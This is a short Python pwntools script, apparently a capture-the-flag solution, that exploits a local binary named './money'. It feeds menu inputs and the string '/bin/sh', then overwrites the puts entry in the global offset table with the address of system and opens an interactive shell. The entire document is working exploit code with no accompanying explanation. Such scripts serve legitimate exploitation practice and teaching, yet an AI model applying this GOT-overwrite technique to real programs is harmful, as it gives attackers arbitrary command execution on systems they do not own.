from pwn import *

binary = "./money"
r = process(binary)
e = ELF(binary)

puts_got = e.got['puts']
system_plt = e.plt['system']

r.sendline(b"1")

r.sendline(b"/bin/sh\x00")

r.sendline(b"201527")

r.sendline(str(puts_got).encode())
r.sendline(str(system_plt).encode())

r.sendline(b"2")

r.interactive()